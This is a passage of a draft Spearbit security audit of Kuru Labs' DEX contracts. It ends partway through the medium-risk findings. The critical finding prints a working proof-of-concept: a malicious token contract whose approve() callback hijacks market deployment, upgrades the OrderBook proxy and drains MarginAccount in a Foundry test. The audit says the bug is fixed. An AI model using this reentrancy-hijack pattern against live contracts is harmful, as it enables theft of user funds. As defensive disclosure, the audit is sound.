**Kuru Contracts Security Review**

DRAFT

**Auditors**

Desmond Ho, Lead Security Researcher

Kurt Barry, Lead Security Researcher

Akshay Srivastav, Security Researcher

Hake, Associate Security Researcher

**Report prepared by: **Lucas Goiriz

August 5, 2025

**Contents**

**1**

**About Spearbit**

**3**

**2**

**Introduction**

**3**

**3**

**Risk classification**

**3**

3.1 Impact . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

3

3.2 Likelihood . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

3

3.3 Action required for severity levels . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

3

**4**

**Executive Summary**

**4**

**5**

**Findings**

**5**

5.1 Critical Risk . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

5

5.1.1

Execution sequence of Router.deployProxy function can be exploited to drain MarginAc-

count completely . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

5

5.2 High Risk . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

8

5.2.1

Vault not credited maker rebates due to missing assignment

. . . . . . . . . . . . . . . . . . 

8

5.2.2

Withdraw amounts aren't modified when expected to be . . . . . . . . . . . . . . . . . . . . . 

9

5.3 Medium Risk . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

9

5.3.1

Markets Can Be Created With Inconsistent Type and Tokens . . . . . . . . . . . . . . . . . . 

9

5.3.2

Inability of upgradeMultipleOrderBookProxies and upgradeMultipleVaultProxies func-

tions to pass data and value . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

11

5.3.3

KuruForwarder: Missing deadlines for signatures . . . . . . . . . . . . . . . . . . . . . . . . . 

11

5.3.4

Accumulated rounding loss on fragmented flip order fills . . . . . . . . . . . . . . . . . . . . . 

11

5.3.5

KuruForwarder: Out of order execution of user requests . . . . . . . . . . . . . . . . . . . . . 

13

5.3.6

Large vault withdrawals may fail due to settlement amount adjustments . . . . . . . . . . . . 

13

5.3.7

Vault operations can be performed when OrderBook is paused . . . . . . . . . . . . . . . . . 

22

5.3.8

Unchecked Casts Pose Significant Risk . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

23

5.4 Low Risk

. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

23

5.4.1

Incoming flip order prices should not be equal best available prices . . . . . . . . . . . . . . . 

23

5.4.2

batchClaimMaxTokens\(\) will not work for native tokens

. . . . . . . . . . . . . . . . . . . . . 

23

5.4.3

No boundaries for minSize could lead to DOS or market misconfiguration . . . . . . . . . . . 

24

5.4.4

A large maxSize could suffer DoS if it iterates through enough minSize orders . . . . . . . . . 

24

5.4.5

Market Creation Frontrunning . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

25

5.4.6

MarginAccountRequest can be disguised as ForwardRequest

. . . . . . . . . . . . . . . . . 

25

5.4.7

Missing validation checks . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

26

5.4.8

DRAFT

approve\(\) used instead of safeApprove\(\) . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

27

5.4.9

Missing storage gap in AbstractAMM . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

27

5.4.10 Missing overriding \_domainNameAndVersionMayChange function in KuruForwarder . . . . . . 

27

5.4.11 KuruForwarder: Missing sufficient msg.value check in execution functions

. . . . . . . . . . 

28

5.4.12 KuruForwarder: Missing restrictions on marginAccount and market addresses . . . . . . . . 

28

5.4.13 MarginAccount: Missing ability to change feeCollector address . . . . . . . . . . . . . . . . 

28

5.4.14 Breaking checks-effects-interactions pattern . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

29

5.4.15 Router: Missing inclusion of \_kuruAmmSpread for market salt creation . . . . . . . . . . . . . 

29

5.4.16 KuruAMMVault.deposit: native tokens are refunded to incorrect address

. . . . . . . . . . . 

29

5.4.17 KuruAMMVault: Incorrect withdraw function implementation . . . . . . . . . . . . . . . . . . . 

29

5.4.18 IERC20.decimals\(\) Function Not Marked view and Returns Non-standard Type . . . . . . . 

30

5.4.19 Missing Setter Functions

. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

30

5.4.20 No Reentrancy Protection Despite Extensive Native Token Use . . . . . . . . . . . . . . . . . 

30

5.4.21 Vault Can Leak Value to Arbitrage Due to Deposit Rebalancing . . . . . . . . . . . . . . . . . 

31

5.4.22 Delete Orders From Storage Upon Cancellation

. . . . . . . . . . . . . . . . . . . . . . . . . 

31

5.5 Gas Optimization . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

31

5.5.1

Redundancies . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

31

5.5.2

Static estimations should have their own separate function

. . . . . . . . . . . . . . . . . . . 

33

5.5.3

Inefficient implementation of \_depositToMarginAccount\(\) . . . . . . . . . . . . . . . . . . . 

33

1

5.5.4

Unnecessary repeated calculation of vault order best prices . . . . . . . . . . . . . . . . . . . 

34

5.5.5

Cache storage variables and repeated calculations in memory . . . . . . . . . . . . . . . . . 

34

5.5.6

Vacuous and Unused Function Return Values . . . . . . . . . . . . . . . . . . . . . . . . . . . 

34

5.5.7

Changing return prices for empty vault and orderbook simplifies some checks . . . . . . . . . 

35

5.5.8

No need to inherit Ownable for OrderBook and KuruAMMVault contracts

. . . . . . . . . . . . 

37

5.5.9

KuruForwarder: ECDSA.recoverCalldata can be used instead of ECDSA.recover

. . . . . . 

37

5.5.10 Returned value of \_msgSender\(\) function can be cached to save gas

. . . . . . . . . . . . . 

37

5.5.11 Store Precisions Instead of Decimals for Base and Quote Assets . . . . . . . . . . . . . . . . 

38

5.6 Informational . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

38

5.6.1

Better Function / Variable / Contract / File Naming . . . . . . . . . . . . . . . . . . . . . . . . 

38

5.6.2

Improve creditUsersEncoded\(\) readability . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

41

5.6.3

Missing documentation on critical storage altering function

. . . . . . . . . . . . . . . . . . . 

41

5.6.4

ERC777 reentrancy could drain isolated market . . . . . . . . . . . . . . . . . . . . . . . . . . 

41

5.6.5

Typography mistakes . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

42

5.6.6

Expand documentation to include nuanced behavior expectations

. . . . . . . . . . . . . . . 

42

5.6.7

Refactoring Recommendations for Readability . . . . . . . . . . . . . . . . . . . . . . . . . . 

43

5.6.8

Obsolete / Incorrect Comments . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

43

5.6.9

Function Visibility . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

44

5.6.10 Import Organization . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

45

5.6.11 Unused Imports and Code

. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

45

5.6.12 Contract Field Visibility . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

45

5.6.13 Compiler Settings . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

46

5.6.14 Missing revert reason . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

46

5.6.15 KuruForwarder: boolean returned by execution functions can be omitted

. . . . . . . . . . . 

46

5.6.16 SafeTransferLib.safeTransferETH can be used to send native tokens . . . . . . . . . . . . 

47

5.6.17 Missing event emission . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

47

5.6.18 Enforce a message length check when called via trusted forwarder . . . . . . . . . . . . . . . 

47

5.6.19 KuruERC20: Use Solady's ERC20 instead of OpenZeppelin's ERC20 to support permit function 48

5.6.20 MarginAccount.creditUsersEncoded should validate the length of \_encodedData input . . . 

48

5.6.21 The \_msgSender function can be implemented in ERC2771Context contract . . . . . . . . . . 

48

5.6.22 Use Libraries for ERC20 Interfaces . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

49

5.6.23 Incomplete and Inconsistent Natspec

. . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

49

5.6.24 Potentially Confusing Errors In Market Order Functions . . . . . . . . . . . . . . . . . . . . . 

49

5.6.25 Move MintableERC20.sol To Test Directory . . . . . . . . . . . . . . . . . . . . . . . . . . . . 

50

5.6.26 Have mutator for allowedInterface mapping . . . . . . . . . . . . . . . . . . . . . . . . . . . 

50

DRAFT

2

**1**

**About Spearbit**

Spearbit is a decentralized network of expert security engineers offering reviews and other security related services to Web3 projects with the goal of creating a stronger ecosystem. Our network has experience on every part of the blockchain technology stack, including but not limited to protocol design, smart contracts and the Solidity compiler. 

Spearbit brings in untapped security talent by enabling expert freelance auditors seeking flexibility to work on interesting projects together. 

Learn more about us at spearbit.com

**2**

**Introduction**

Kuru Labs builds open source software that helps you create and deploy high-frequency crypto trading bots. 

Disclaimer : This security review does not guarantee against a hack. It is a snapshot in time of Kuru Contracts according to the specific commit. Any modifications to the code will require a new security review. 

**3**

**Risk classification**

**Severity level**

**Impact: High**

**Impact: Medium**

**Impact: Low**

**Likelihood: high**

Critical

High

Medium

**Likelihood: medium**

High

Medium

Low

**Likelihood: low**

Medium

Low

Low

**3.1**

**Impact**

• High - leads to a loss of a significant portion \(>10%\) of assets in the protocol, or significant harm to a majority of users. 

• Medium - global losses <10% or losses to only a subset of users, but still unacceptable. 

• Low - losses will be annoying but bearable--applies to things like griefing attacks that can be easily repaired or even gas inefficiencies. 

**3.2**

**Likelihood**

• High - almost cer DRAFT

tain to happen, easy to perform, or not easy but highly incentivized

• Medium - only conditionally possible or incentivized, but still relatively likely

• Low - requires stars to align, or little-to-no incentive

**3.3**

**Action required for severity levels**

• Critical - Must fix as soon as possible \(if already deployed\)

• High - Must fix \(before deployment if not already deployed\)

• Medium - Should fix

• Low - Could fix

3

**4**

**Executive Summary**

Over the course of 42 days in total, Kuru Labs engaged with Spearbit to review the kuru-contracts protocol. In this period of time a total of **70 **issues were found. 

**Summary**

**Project Name**

Kuru Labs

**Repository**

kuru-contracts

**Commit**

18546bf5

**Type of Project**

DeFi, DEX

**Audit Timeline**

Jun 3rd to Jul 16th

**Issues Found**

**Severity**

**Count**

**Fixed**

**Acknowledged**

Critical Risk

1

1

0

High Risk

2

2

0

Medium Risk

8

6

2

Low Risk

22

17

5

Gas Optimizations

11

8

3

Informational

26

22

4

**Total**

**70**

**56**

**14**

DRAFT

4

**5**

**Findings**

**5.1**

**Critical Risk**

**5.1.1**

**Execution sequence of **Router.deployProxy **function can be exploited to drain **MarginAccount **completely**

**Severity: **Critical Risk

**Context: **KuruAMMVault.sol\#L58-L63, Router.sol\#L99

**Description: **The protocol allows permissionless market creation with arbitrary base and quote ERC20 assets. 

In the Router.deployProxy function it can be observed that contract states are updated after deploying and initializing OrderBook and KuruAMMVault contracts. Further it can be noted that KuruAMMVault is initialized before initializing OrderBook contract, and KuruAMMVault.initialize function makes ERC20.approve calls on base and quote tokens:

• Router.sol:

function deployProxy\( /\* ... \*/ \) public returns \( /\* ... \*/ \) \{

// ... 

proxy = Create2.deploy\(

0, 

\_salt, 

abi.encodePacked\(type\(ERC1967Proxy\).creationCode, abi.encode\(orderBookImplementation, 

,\! 

bytes\(""\)\)\)

\); 

IKuruAMMVault \_kuruAmmVault = \_deployKuruAMMVault\(\_baseAssetAddress, \_quoteAssetAddress, 

,\! 

proxy, \_kuruAmmSpread\); 

// ... 

IOrderBook\(proxy\).initialize\(...\); 

verifiedMarket\[proxy\] = MarketParams\(...\); 

\_kuruAmmVault.setMarketParams\(\); 

\_registerMarket\(\_baseAssetAddress, \_quoteAssetAddress, proxy, \_type\); 

// ... 

\}

function \_deployKuruAMMVault\(...\) internal returns \(...\) \{

address \_vault = Create2.deploy\(

0, 

keccak256\(abi.encode\(\_marketAddress\)\), 

,\! 

\); 

DRAFT

abi.encodePacked\(type\(ERC1967Proxy\).creationCode, abi.encode\(kuruAmmVaultImplementation, 

bytes\(""\)\)\)

IKuruAMMVault\(\_vault\).initialize\(...\); 

return IKuruAMMVault\(\_vault\); 

\}

• KuruAMMVault.sol:

function initialize\( /\* ... \*/ \) public initializer \{

\_initializeOwner\(\_owner\); 

// ... 

if \(token1\_ \!= address\(0\)\) \{

ERC20\(token1\_\).approve\(\_marginAccount, type\(uint256\).max\); 

\}if \(token2\_ \!= address\(0\)\) \{

ERC20\(token2\_\).approve\(\_marginAccount, type\(uint256\).max\); 

\}

\}

5

Since vault is initialized before market and vault makes external calls to token contract, this sequence of execution can be exploited to hijack a market by upgrading its code and then using that market to drain the MarginAccount contract. 

Attack Scenario:

1. Create a malicious token with approve function and create a malicious OrderBook implementation. 

2. Call Router.deployProxy function with malicious token address. 

3. The Router contract will deploy a legitimate OrderBook proxy, a KuruAMMVault proxy and will call KuruAMMVault.initialize\(\) which will call the malicious token's approve function. 

4. As attacker now has the control over call's execution, the attacker will call the OrderBook.initialize function and will become the owner of OrderBook proxy. 

5. Using the ownership rights the attacker upgrades the OrderBook's code to the malicious implementation by calling the OrderBook.upgradeToAndCall. 

6. Once the execution returns back to Router it will add the freshly created OrderBook proxy to whitelist of MarginAccount via MarginAccount.updateMarkets. 

7. The market contract whose code was updated by attacker gets added to whitelist of MarginAccount. 

8. Attacker can now simply create credits for any account in MarginAccount and drain all funds. 

**Proof of Concept: **Add this contract and test case in test/RouterTest.t.sol. 

• RouterRentrancyExploiter.sol:

contract RouterRentrancyExploiter \{

address public victimMarket; 

function setVictimMarket\(address \_victim\) public \{

victimMarket = \_victim; 

\}

function approve\(address, uint256\) DRAFT

external returns \(bool\) \{

OrderBook market = OrderBook\(victimMarket\); 

// set market owner to address\(this\)

market.initialize\(\{

\_owner: address\(this\), 

\_type: IOrderBook.OrderBookType.NATIVE\_IN\_BASE, 

\_baseAssetAddress: address\(0\), 

\_baseAssetDecimals: 0, 

\_quoteAssetAddress: address\(0\), 

\_quoteAssetDecimals: 0, 

\_marginAccountAddress: address\(0\), 

\_sizePrecision: uint96\(0\), 

\_pricePrecision: 0, 

\_tickSize: 0, 

\_minSize: 0, 

\_maxSize: 0, 

\_takerFeeBps: 2\_00, 

// 2%

\_makerFeeBps: 1\_00, 

// 1%

\_kuruAmmVault: address\(0\), 

\_kuruAmmSpread: 10, 

\_\_trustedForwarder: address\(0\)

\}\); 

// upgrade market code

market.upgradeToAndCall\(address\(this\), ""\); 

return true; 

\}

6

function marginAccountCredit\(address marginAccount, address user, address token, uint256

,\! 

amount\) public \{

MarginAccount\(payable\(marginAccount\)\).creditUser\(user, token, amount, false\); 

\}

fallback\(\) external payable \{\}

receive\(\) external payable \{\}

function initialize\(

address /\* \_owner \*/ , 

IOrderBook.OrderBookType /\* \_type \*/ , 

address /\* \_baseAssetAddress \*/ , 

uint256 /\* \_baseAssetDecimals \*/ , 

address /\* \_quoteAssetAddress \*/ , 

uint256 /\* \_quoteAssetDecimals \*/ , 

address /\* \_marginAccountAddress \*/ , 

uint96 /\* \_sizePrecision \*/ , 

uint32 /\* \_pricePrecision \*/ , 

uint32 /\* \_tickSize \*/ , 

uint96 /\* \_minSize \*/ , 

uint96 /\* \_maxSize \*/ , 

uint256 /\* \_takerFeeBps \*/ , 

uint256 /\* \_makerFeeBps \*/ , 

address /\* \_kuruAmmVault \*/ , 

uint96 /\* \_kuruAmmSpread \*/ , 

address /\* \_\_trustedForwarder \*/

\) external \{\}

function decimals\(\) external pure returns \(uint8\) \{

return 18; 

\}

function proxiableUUID\(\) public pureDRAFT

returns \(bytes32\) \{

return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc; 

\}

function getMarketParams\(\)

external

view

returns \(uint32, uint96, address, uint256, address, uint256, uint32, uint96, uint96, 

,\! 

uint256, uint256\)

\{\}

\}

• Test case:

7

function test\_poc\_Router\_deployProxy\_reentrancy\(\) public \{

address attacker = makeAddr\("attacker"\); 

// create TVL

address alice = makeAddr\("alice"\); 

vm.deal\(alice, 100 ether\); 

vm.prank\(alice\); 

marginAccount.deposit\{value: 100 ether\}\(alice, address\(0\), 100 ether\); 

assertEq\(marginAccount.getBalance\(alice, address\(0\)\), 100 ether\); 

assertEq\(address\(marginAccount\).balance, 100 ether\); 

RouterRentrancyExploiter exploiterC = new RouterRentrancyExploiter\(\); 

address market = router.computeAddress\(address\(0\), address\(exploiterC\), uint96\(1e18\), 100, 

,\! 

100, 0.0001e18, type\(uint96\).max, 2\_00, 1\_00, address\(0\), false\); 

exploiterC.setVictimMarket\(market\); 

router.deployProxy\(\{

\_type: IOrderBook.OrderBookType.NATIVE\_IN\_BASE, 

\_baseAssetAddress: address\(0\), 

\_quoteAssetAddress: address\(exploiterC\), 

\_sizePrecision: uint96\(1e18\), 

\_pricePrecision: 100, 

\_tickSize: 100, 

\_minSize: 0.0001e18, 

\_maxSize: type\(uint96\).max, 

\_takerFeeBps: 2\_00, 

\_makerFeeBps: 1\_00, 

\_kuruAmmSpread: 100

\}\); 

assertEq\(marginAccount.verifiedMarket\(market\), true\); 

// drain the protocol

RouterRentrancyExploiter\(payable

,\! 

DRAFT

\(market\)\).marginAccountCredit\(address\(marginAccount\), 

attacker, address\(0\), 100 ether\); 

assertEq\(address\(marginAccount\).balance, 0\); 

assertEq\(attacker.balance, 100 ether\); 

\}

**Recommendation: **Consider avoiding all external calls in proxy initializations. 

**Kuru Labs: **Fixed in commit 2cba5d10. The approvals have been moved to after the state updates in commit

ef5031e4. 

**Spearbit: **Fix verified. 

**5.2**

**High Risk**

**5.2.1**

**Vault not credited maker rebates due to missing assignment**

**Severity: **High Risk

**Context: **AbstractAMM.sol\#L209, AbstractAMM.sol\#L231

**Description: **The \_creditVaultOnMarketBuy function constructs the bytes payload that is used to credit the kuruAmmVault assets its maker fee rebate. However, bytes.concat doesn't modify in-place, so since the result of bytes.concat\(\) was not assigned back to returnData, the fee rebate information is created but immediately discarded, resulting in the loss of maker fees. 

**Recommendation:**

8

- bytes.concat\(returnData, abi.encode\(kuruAmmVault, \_getBaseAsset\(\), feeRebate, true\)\); 

\+ returnData = bytes.concat\(returnData, abi.encode\(kuruAmmVault, \_getBaseAsset\(\), feeRebate, true\)\); **Kuru Labs: **Fixed in commit 96342c27. 

**Spearbit: **Fix verified. 

**5.2.2**

**Withdraw amounts aren't modified when expected to be**

**Severity: **High Risk

**Context: **KuruAMMVault.sol\#L280-L295, KuruAMMVault.sol\#L331

**Description: **Within \_updateMarketVaultOrderSize\(\), the amount1 \(base asset\) and amount2 \(quote asset\) parameters are adjusted to account for the settlement of the vault's partially filled bid and ask orders. However, these adjustments are not returned to the parent function, so the subsequent call to \_withdrawFromMarginAccount uses the original, pre-settlement values. 

**Recommendation: **The issue has been fixed prior to the report in PR 53 that no longer modifies the withdrawal amounts in \_updateMarketVaultOrderSize\(\), making returning values redundant. The mentioned PR will be reviewed in a subsequent fix review. 

**Kuru Labs: **Fixed in commit f8ff4c73. 

**Spearbit: **Fix verified. 

**5.3**

**Medium Risk**

**5.3.1**

**Markets Can Be Created With Inconsistent Type and Tokens**

**Severity: **Medium Risk

**Context: **Router.sol\#L67-L158

**Description: **In Router.deployProxy\(\), the

DRAFT

addresses of the base and quote tokens are passed as parameters. 

The market type is passed as well, and can a value indicating that either the base or quote token is native. In some cases, the code uses ternary operators to ignore the passed base or quote token address in favor of using the NATIVE constant for the appropriate token address, but this is not done consistently. The following operations use the token addresses as passed without checking whether one should be NATIVE:

• The check that the assets are distinct; 

• The deployment of the AMM vault; 

• The assignment of a MarketParams struct to the verifiedMarket mapping; 

• The call to the internal function \_registerMarket\(\); 

• And, the emission of the MarketRegistered event. 

This allows markets to be created in an inconsistent state where the type indicates that one token should be native but this is not reflected appropriately, particularly in the AMM vault. Such markets will not function correctly at best and could even lead to losses for users attempting to interact with them. 

**Proof of Concept: **Add this test case in test/RouterTest.t.sol:

function test\_poc\_invalidMarketAndVaultDeployment\(\) public \{

// Add import:- import \{MockERC20\} from "forge-std/mocks/MockERC20.sol"; 

MockERC20 \_mockToken1 = new MockERC20\(\); 

\_mockToken1.initialize\("", "", 8\); 

MockERC20 \_mockToken2 = new MockERC20\(\); 

\_mockToken2.initialize\("", "", 6\); 

OrderBook \_orderBook = OrderBook\(router.deployProxy\(\{

9

\_type: IOrderBook.OrderBookType.NATIVE\_IN\_BASE, 

\_baseAssetAddress: address\(\_mockToken1\), 

\_quoteAssetAddress: address\(\_mockToken2\), 

\_sizePrecision: uint96\(1e18\), 

\_pricePrecision: 100, 

\_tickSize: 100, 

\_minSize: 0.0001e18, 

\_maxSize: type\(uint96\).max, 

\_takerFeeBps: 2\_00, 

\_makerFeeBps: 1\_00, 

\_kuruAmmSpread: 100

\}\)\); 

\(,, address \_marketBase, uint256 \_marketBaseDecimals, address \_marketQuote, uint256

,\! 

\_marketQuoteDecimals,,,,,\) = \_orderBook.getMarketParams\(\); 

\(address \_vaultAddress, ,,,,,,\) = \_orderBook.getVaultParams\(\); 

bytes32 \_vaultToken1 = vm.load\(address\(\_vaultAddress\), bytes32\(uint256\(0\)\)\); 

bytes32 \_vaultToken1Decimals = vm.load\(address\(\_vaultAddress\), bytes32\(uint256\(1\)\)\); 

bytes32 \_vaultToken2 = vm.load\(address\(\_vaultAddress\), bytes32\(uint256\(2\)\)\); 

bytes32 \_vaultToken2Decimals = vm.load\(address\(\_vaultAddress\), bytes32\(uint256\(3\)\)\); 

// Valid states

assertEq\(\_marketBase, address\(0\)\); 

assertEq\(\_marketQuote, address\(\_mockToken2\)\); 

assertEq\(\_marketBaseDecimals, 18\); 

assertEq\(\_marketQuoteDecimals, \_mockToken2.decimals\(\)\); 

// Invalid states

assertEq\(\_vaultToken1, bytes32\(uint256\(uint160\(address\(\_mockToken1\)\)\)\)\); 

// incorrect

assertEq\(\_vaultToken2, bytes32\(uint256\(uint160\(address\(\_mockToken2\)\)\)\)\); 

assertEq\(\_vaultToken1Decimals, bytes32\(uint256\(\_mockToken1.decimals\(\)\)\)\); 

// incorrect

assertEq\(\_vaultToken2Decimals, bytes32\(uint256\(\_mockToken2.decimals\(\)\)\)\); 

\(,,\_marketBase, \_marketBaseDecimals, \_marketQuote, \_marketQuoteDecimals,,,,,\) =

,\! 

router.verifiedMarket\(address\(\_orderBook\)\); 

assertEq\(\_marketBase, address\(\_mockToken1\)\); 

// incorrect

assertEq\(\_marketQuote, address\(\_mockToken2\)\); 

assertEq\(\_marketBaseDecimals, 18\); 

assertEq\(\_marketQuoteDecimals, \_mockToken2.decimals\(\)\); 

\}

**Recommendation: **Rather than expanding the current usage of ternary operators to override the passed token parameters, it is

DRAFT

suggested to remove the existing ternary operators and instead add checks validating the provided token addresses are consistent with the market type. For example:

if \(\_type == IOrderBook.OrderBookType.NATIVE\_IN\_BASE\) \{

require\(\_baseAssetAddress == address\(0\), /\* appropriate custom error \*/ \); 

require\(\_quoteAssetAddress \!= address\(0\), /\* appropriate custom error \*/ \); 

\} else if \(\_type == IOrderBook.OrderBookType.NATIVE\_IN\_QUOTE\) \{

require\(\_baseAssetAddress \!= address\(0\), /\* appropriate custom error \*/ \); 

require\(\_quoteAssetAddress == address\(0\), /\* appropriate custom error \*/ \); 

\} else \{

require\(\_baseAssetAddress \!= address\(0\), /\* appropriate custom error \*/ \); 

require\(\_quoteAssetAddress \!= address\(0\), /\* appropriate custom error \*/ \); 

require\(\_baseAssetAddress \!= \_quoteAssetAddress, RouterErrors.BaseAndQuoteAssetSame\(\)\); 

\}

This will simplify the code and ensure that it is not possible to reintroduce a similar bug in future changes by forgetting to use a ternary operator. 

**Kuru Labs: **Fixed in commit a2fc7dea. 

10

**Spearbit: **Fix verified. 

**5.3.2**

**Inability of **upgradeMultipleOrderBookProxies **and **upgradeMultipleVaultProxies **functions to pass** data **and **value

**Severity: **Medium Risk

**Context: **Router.sol\#L240-L250

**Description: **The upgradeMultipleOrderBookProxies and upgradeMultipleVaultProxies upgrade functions of Router lack the ability to pass data to upgradeToAndCall calls. Passing data for upgrades is generally a necessary feature in case the new implementations contain reinitialize-like functions which expect input arguments. 

These functions also lack the ability to pass value to the payable UUPSUpgradeable.upgradeToAndCall function. 

Due to which it always pass 0 value to the upgrade calls. 

**Recommendation: **Consider adding the ability to pass data and value to the upgrade calls. 

**Kuru Labs: **Fixed in PR 56. 

**Spearbit: **Ability to pass data has been added while the ability to pass value is still missing. 

**5.3.3**

KuruForwarder**: Missing deadlines for signatures**

**Severity: **Medium Risk

**Context: **KuruForwarder.sol\#L103, KuruForwarder.sol\#L112, KuruForwarder.sol\#L138, KuruForwarder.sol\#L152

**Description: **The signature verification functions of KuruForwarder contract do not implement any deadlines for signature validity. Due to which a signature once signed remains valid forever. This can result in unintended use of unused user signatures far into the future. 

**Recommendation: **Consider implementing deadlines for user signatures. 

**Kuru Labs: **Fixed in commit 03991d7e. 

**Spearbit: **Fix verified. 

DRAFT

**5.3.4**

**Accumulated rounding loss on fragmented flip order fills**

**Severity: **Medium Risk

**Context: **OrderBook.sol\#L1080, OrderBook.sol\#L1102-L1104

**Description: **There is a precision loss issue when a flip order is filled through multiple small \(fragmented\) trades. 

The repeated rounding down in the size calculation for the flipped order results in a non-negligible loss for the maker. While the taker's accounting appears correct, the maker receives fewer assets than they should. 

**Proof of Concept: **The test below demonstrates how even though the taker receives and pays the same amounts in both scenarios, the maker doesn't: he receives less \(0.045% in the example\) from fragmented orders: function testFillFlipSellOrderInSmallSizes\(\) public \{

uint32 \_buyPrice = 100\_000; 

uint32 \_sellPrice = 110\_000; 

uint96 \_size = \_minSize \+ 1; 

address \_maker = genAddress\(\); 

\_addFlipSellOrder\(\_maker, \_sellPrice, \_buyPrice, \_size\); 

uint96 \_sizeToBuy = \_size \+ 10 \*\* 10; 

uint256 \_quoteToBuy = \(\(\_sizeToBuy \* \_sellPrice\) / SIZE\_PRECISION\) \* 10 \*\* usdc.decimals\(\) /

,\! 

PRICE\_PRECISION; 

address \_taker = genAddress\(\); 

usdc.mint\(\_taker, \_quoteToBuy\); 

vm.startPrank\(\_taker\); 

usdc.approve\(address\(orderBook\), \_quoteToBuy\); 

11

uint256 ethTakerBalanceBefore = eth.balanceOf\(\_taker\); 

uint256 usdcTakerBalanceBefore = usdc.balanceOf\(\_taker\); 

// console.log\("taker ETH balance before: ", ethTakerBalanceBefore\); 

// console.log\("taker USDC balance before: ", usdcTakerBalanceBefore\); 

uint256 ethTakerBalanceAfterFullFill; 

uint256 usdcTakerBalanceAfterFullFill; 

uint256 ethMakerBalanceAfterFullFill; 

uint256 usdcMakerBalanceAfterFullFill; 

uint256 ethTakerBalanceAfterFragmentedFill; 

uint256 usdcTakerBalanceAfterFragmentedFill; 

uint256 ethMakerBalanceAfterFragmentedFill; 

uint256 usdcMakerBalanceAfterFragmentedFill; 

uint256 snapshot = vm.snapshotState\(\); 

// SCENARIO 1: take full size

\{

orderBook.placeAndExecuteMarketBuy\(2210, 0, false, false\); 

ethTakerBalanceAfterFullFill = eth.balanceOf\(\_taker\); 

usdcTakerBalanceAfterFullFill = usdc.balanceOf\(\_taker\); 

// cancel flip order

vm.startPrank\(\_maker\); 

uint40\[\] memory orderIds = new uint40\[\]\(1\); 

orderIds\[0\] = 2; 

orderBook.batchCancelFlipOrders\(orderIds\); 

ethMakerBalanceAfterFullFill = marginAccount.getBalance\(\_maker, address\(eth\)\); 

usdcMakerBalanceAfterFullFill = marginAccount.getBalance\(\_maker, address\(usdc\)\); 

vm.revertToState\(snapshot\); 

\}

// SCENARIO 2: take fragmented size

\{

vm.startPrank\(\_taker\); 

for \(uint i; i < 2210; i\+\+\) \{

orderBook.placeAndExecuteMarketBuy\(1, 0, false, false\); 

\}ethTakerBalanceAfterFragmentedFill = eth.balanceOf\(\_taker\); 

usdcTakerBalanceAfterFragmentedFill = usdc.balanceOf\(\_taker\); 

// cancel flipDRAFT

order

vm.startPrank\(\_maker\); 

uint40\[\] memory orderIds = new uint40\[\]\(1\); 

orderIds\[0\] = 2; 

orderBook.batchCancelFlipOrders\(orderIds\); 

ethMakerBalanceAfterFragmentedFill = marginAccount.getBalance\(\_maker, address\(eth\)\); 

usdcMakerBalanceAfterFragmentedFill = marginAccount.getBalance\(\_maker, address\(usdc\)\); 

\}

assertEq\(ethTakerBalanceAfterFullFill, ethTakerBalanceAfterFragmentedFill\); 

assertEq\(usdcTakerBalanceAfterFullFill, usdcTakerBalanceAfterFragmentedFill\); 

assertEq\(ethMakerBalanceAfterFullFill, ethMakerBalanceAfterFragmentedFill\); 

assertGt\(usdcMakerBalanceAfterFullFill, usdcMakerBalanceAfterFragmentedFill\); 

console.log\("usdc maker balance difference: ", usdcMakerBalanceAfterFullFill -

,\! 

usdcMakerBalanceAfterFragmentedFill\); 

\}

**Recommendation: **The logic for calculating the flipped order size should be re-evaluated to prevent the accumu-12

lation of rounding errors. 1 potential solution could be to wait until the entire order gets filled, or a minimum size, before it gets incremented in the flipped order, to minimize the number of division operations performed and the rounding down impact. 

**Kuru Labs: **Acknowledged, won't be fixing as likelihood is very low at well-set precisions. 

**Spearbit: **Acknowledged. 

**5.3.5**

KuruForwarder**: Out of order execution of user requests**

**Severity: **Medium Risk

**Context: **KuruForwarder.sol\#L103-L108, KuruForwarder.sol\#L169

**Description: **As per the verify and verifyMarginAccountRequest functions any req.nonce >= to the current nonce storage value is considered as valid. Further, the execute and executeMarginAccountRequest functions increment the storage nonce value by req.nonce \+ 1. 

